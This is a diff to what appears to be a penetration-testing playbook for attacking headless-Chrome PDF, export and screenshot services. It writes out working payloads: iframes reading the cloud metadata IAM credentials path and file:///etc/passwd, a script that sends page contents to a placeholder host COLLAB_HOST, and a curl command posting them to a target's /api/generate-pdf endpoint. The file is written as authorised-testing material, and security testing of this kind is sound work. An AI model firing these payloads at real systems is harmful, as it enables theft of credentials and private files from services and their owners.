@@ -24,6 +24,10 @@ metadata:
 ## How to Run
 
 ```bash
+# Set once per engagement; every step below uses these.
+TARGET="example.com"   # or the engagement target
+export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
+
 # Target: invoice generators, report exporters, screenshot services
 # Inject HTML that causes headless Chrome to fetch internal resources
 
@@ -37,8 +41,12 @@ PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/se
 PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
 
 # JavaScript execution (if sandbox not enforced)
-PAYLOAD='<html><body><script>
-# ... (continues in Procedure)
+export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'
+
+# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
+curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
+  -H "Content-Type: application/json" \
+  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
 ```
 
 ## Procedure
@@ -154,14 +162,12 @@ PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/se
 PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
 
 # JavaScript execution (if sandbox not enforced)
-PAYLOAD='<html><body><script>
-fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
-</script></body></html>'
+export PAYLOAD='<html><body><script>fetch("http://COLLAB_HOST/chrome-rce?d="+encodeURIComponent(document.documentElement.innerHTML))</script></body></html>'
 
 # Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
 curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/generate-pdf" \
   -H "Content-Type: application/json" \
-  -d "{\"html\": \"$PAYLOAD\"}"
+  -d "$(python3 -c 'import json,os; print(json.dumps({"html": os.environ["PAYLOAD"]}))')"
 ```
 
 ---
@@ -188,20 +194,20 @@ curl --max-time 30 --connect-timeout 10 -s -X POST "https://$TARGET/api/import" 
 
 ---
 
-## Verification
-
-- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
-- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
-- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
-
----
-
 ## Pitfalls
 - **Upload without execution** — uploading a `.php` file to a directory that serves it as text/plain is not RCE. Need code execution, not just file storage.
 - **SVG XSS without same-origin rendering** — SVG uploaded to a different origin may not execute scripts due to CSP or same-origin policy. Test in the actual rendering context.
 - **Extension blacklist bypass without server-side validation** — bypassing client-side extension check proves nothing. Always test server-side acceptance.
 - **Content-Type spoofing** — changing Content-Type header doesn't change how the server processes the file. Need to confirm server-side MIME confusion.
 - **Path traversal in filename** — `../../../etc/passwd` in filename is path traversal, not upload exploit. Distinguish the two.
+
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
